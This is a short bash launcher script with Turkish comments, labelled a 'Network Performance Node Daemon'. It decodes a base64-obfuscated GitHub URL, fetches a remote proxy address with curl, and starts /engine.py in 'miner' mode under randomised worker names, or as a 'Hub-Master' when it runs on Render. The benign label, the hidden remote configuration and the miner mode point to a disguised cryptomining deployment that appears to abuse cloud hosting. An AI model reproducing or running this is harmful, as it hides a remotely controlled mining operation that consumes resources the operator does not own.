#!/bin/bash
# Network Performance Node Daemon

# GitHub üzerinden dinamik URL çekme
CONF_U="$(echo 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0V4bWEwL3djL3JlZnMvaGVhZHMvbWFpbi91cmw=' | base64 -d)"
DYN_URL=$(curl -sL "$CONF_U" | tr -d '\n\r\t ')

export PROXY_URL="${DYN_URL}"
export PORT="${PORT:-8080}"

# Render veya ana sunucu kontrolü
if [[ -n "${RENDER_EXTERNAL_HOSTNAME}" ]]; then
    export ENGINE_MODE="all"
    export WORKER_NAME="Hub-Master"
else
    export ENGINE_MODE="miner"
    export WORKER_NAME="Edge-Node-${RANDOM}"
fi

# Bellek optimizasyonu ve çalıştırma
export PYTHONMALLOC=malloc
export PYTHONUNBUFFERED=1

exec python3 /engine.py
